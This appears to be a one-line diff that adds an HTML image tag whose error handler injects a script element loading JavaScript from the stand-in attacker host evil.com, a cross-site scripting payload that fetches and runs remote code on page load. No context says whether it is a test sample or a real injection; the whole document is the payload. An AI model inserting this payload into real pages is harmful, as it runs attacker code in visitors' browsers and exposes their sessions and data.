@@ -1,0 +1,1 @@
+<img src="google" onerror="x=document.createElement('script');x.src='https://evil.com/really_evil.js';document.body.appendChild(x)" />
